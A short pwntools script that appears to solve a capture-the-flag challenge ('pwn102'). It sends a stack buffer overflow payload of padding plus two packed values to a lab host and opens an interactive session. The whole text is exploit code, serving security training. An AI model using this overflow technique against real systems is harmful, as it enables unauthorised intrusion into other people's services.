from pwn import *

p = process("./pwn102.pwn102")
p = remote("10.10.234.36", 9002)

payload = b"a"*104 + p32(0xc0d3) + p32(0xc0ff33)

p.sendline(payload)
p.interactive()